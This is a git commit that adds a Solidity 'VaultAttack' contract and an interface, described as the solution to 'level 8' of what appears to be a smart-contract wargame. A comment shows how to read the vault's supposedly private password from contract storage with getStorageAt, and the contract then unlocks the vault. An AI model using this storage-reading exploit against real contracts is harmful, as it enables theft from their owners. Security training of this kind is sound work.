e15fe6dfcde0e21a07c6e28c8d18a36bf02c0f43
emretepedev <emretepedev@gmail.com>
2022-07-17 05:26:27 +0300

    feat(contract): add solution to level 8

---
+++ contracts/8-VaultAttack.sol
@@ -0,0 +1,23 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./interfaces/8-IVault.sol";
+
+contract VaultAttack {
+    IVault public immutable victimVault;
+
+    constructor(IVault victimVault_) {
+        victimVault = victimVault_;
+    }
+
+    /**
+     * @dev To get password from storage, you can run this script in client side:
+     * await web3.eth.getStorageAt(contract.address, 1)
+     */
+    function attack(bytes32 password) external {
+        victimVault.unlock(password);
+
+        require(!victimVault.locked(), "Vault: Attack failed");
+    }
+}
---
+++ contracts/interfaces/8-IVault.sol
@@ -0,0 +1,9 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+interface IVault {
+    function locked() external view returns (bool);
+
+    function unlock(bytes32 _password) external;
+}
